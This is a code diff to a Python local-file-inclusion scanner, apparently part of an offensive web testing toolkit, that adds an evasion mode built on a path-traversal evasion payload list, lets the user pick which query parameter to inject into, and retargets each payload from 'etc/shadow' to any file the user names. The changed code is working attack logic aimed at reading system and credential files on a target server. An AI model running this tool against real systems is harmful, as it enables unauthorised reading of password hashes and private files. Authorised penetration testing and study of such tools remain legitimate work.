@@ -24,6 +24,7 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 payloads = []
+ev = [""]
 
 gotcha = []
 loggy = []
@@ -115,26 +116,34 @@ def outto0x00(toPrint,stack):
 def getFile0x00():
 
     try:
-        print(GR+' [*] Importing filepath...')
-        print(O+' [#] Enter path to file (default: files/fuzz-db/lfi_paths.lst)...')
-        w = input(O+' [#] Your input (Press Enter if default) :> '+C)
-        if w == '':
-            fi = 'files/fuzz-db/lfi_paths.lst'
-            print(GR+' [*] Importing payloads...')
-            with open(fi,'r') as q0:
-                for q in q0:
-                    q = q.replace('\n','')
-                    payloads.append(q)
-        else:
-            fi = w
-            if os.path.exists(fi) == True:
-                print(G+' [+] File '+fi+' found...')
+        ev[0] = input(O+"\n [?] Perform Evasion Attack? (specific file ; enter for no) :> ")
+        evasion = ev[0] != ""
+        if not evasion:
+            print(GR+' [*] Importing filepath...')
+            print(O+' [#] Enter path to file (default: files/fuzz-db/lfi_paths.lst)...')
+            w = input(O+' [#] Your input (Press Enter if default) :> '+C)
+            if w == '':
+                fi = 'files/fuzz-db/lfi_paths.lst'
                 print(GR+' [*] Importing payloads...')
                 with open(fi,'r') as q0:
                     for q in q0:
                         q = q.replace('\n','')
                         payloads.append(q)
-
+            else:
+                fi = w
+                if os.path.exists(fi) == True:
+                    print(G+' [+] File '+fi+' found...')
+                    print(GR+' [*] Importing payloads...')
+                    with open(fi,'r') as q0:
+                        for q in q0:
+                            q = q.replace('\n','')
+                            payloads.append(q)
+        else:
+            fi = 'files/fuzz-db/pathtrav_evasion.lst'
+            with open(fi,'r') as q0:
+                for q in q0:
+                    q = q.replace('\n','')
+                    payloads.append(q)
     except IOError:
         print(R+' [-] File path '+O+fi+R+' not found!')
 
@@ -150,6 +159,20 @@ def lfi(web):
     param = input(O+' [#] Parameter Path (eg. /vuln/fetch.php?q=lmao) :> ')
     if not param.startswith('/'):
         param = '/' + param
+    choice = ""
+    if "&" in param:
+        ln = len(param.split("&"))
+        choice = input(" [!] Discovered {} parameters. Which one to use? (enter name) :> ".format(ln))
+        if not choice in param:
+            sys.exit(" [-] Param {} not found.".format(choice))
+
+    bug2 = ""
+    if choice != "":
+        n = param.split(choice + "=")[1]
+        if "&" in n:
+            bug2 = param.split(choice)[1]
+            tmp = bug2.split("&")[0]
+            bug2 = bug2.replace(tmp,"")
     getFile0x00()
     print(GR+' [*] Setting headers...')
     gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
@@ -160,12 +183,17 @@ def lfi(web):
 
     print(O+' [!] Parsing Url...')
     time.sleep(0.7)
-    web0 = web + param
-    web00 = web0.split('=')[0] + '='
+    web00 = web + param.split(choice + '=')[0] + choice + '='
     try:
+        evasion = ev[0] != ""
+        filepath = ""
+        if evasion:
+            filepath = input(" [!] Enter file and path to search (Default: etc/shadow) :> ")
         for pay in payloads:
+            if evasion and filepath != "":
+                pay = pay.replace("etc/shadow", filepath)
             print(GR+'\n [*] Setting parameters...')
-            web0x00 = web00 + pay
+            web0x00 = web00 + pay + bug2
             print(C+' [+] Using path : '+B+str(pay))
             print(B+' [+] Url : '+GR+str(web0x00))
             check0x00(web0x00, pay, gen_headers)
